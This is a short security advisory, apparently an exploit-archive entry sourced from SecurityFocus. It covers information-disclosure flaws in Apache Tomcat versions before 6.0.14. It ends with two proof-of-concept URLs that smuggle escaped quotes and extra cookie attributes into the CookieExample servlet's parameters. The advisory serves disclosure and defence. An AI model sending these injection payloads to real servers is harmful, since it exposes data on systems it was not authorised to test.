@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/25316/info
+
+Apache Tomcat is prone to multiple information-disclosure vulnerabilities because it fails to adequately sanitize user-supplied data.
+
+Attackers can exploit these issues to access potentially sensitive data that may aid in further attacks.
+
+Versions prior to Apache Tomcat 6.0.14 are vulnerable. 
+
+http://www.example.com:8080/examples/servlets/servlet/CookieExample?cookiename=HAHA&cookievalue=%5C%22FOO%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2F%3B
+
+http://www.example.com:8080/servlets-examples/servlet/CookieExample?cookiename=BLOCKER&cookievalue=%5C%22A%3D%27%3B+Expires%3DThu%2C+1+Jan+2009+00%3A00%3A01+UTC%3B+Path%3D%2Fservlets-examples%2Fservlet+%3B 
